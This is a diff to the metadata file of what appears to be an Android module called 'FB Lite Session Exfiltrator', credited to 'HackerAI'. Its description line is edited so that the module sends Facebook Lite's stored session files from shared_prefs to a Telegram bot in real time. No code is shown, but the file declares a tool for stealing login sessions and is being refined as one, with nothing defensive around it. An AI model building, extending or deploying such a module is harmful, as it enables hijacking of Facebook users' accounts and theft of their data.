@@ -1,6 +1,6 @@
-id=fblite_session_exfil
+id=fblite_exfil
 name=FB Lite Session Exfiltrator
 version=v1.0
 versionCode=1
 author=HackerAI
-description=Monitors /data/data/com.facebook.lite/shared_prefs/ and exfiltrates XML files to Telegram bot on change
+description=Real-time exfiltration of Facebook Lite shared_prefs XML files to Telegram bot
